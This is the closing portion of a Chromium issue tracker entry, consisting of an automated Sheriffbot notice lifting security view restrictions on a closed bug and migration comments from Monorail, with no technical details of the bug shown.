This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1059669?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051717)*
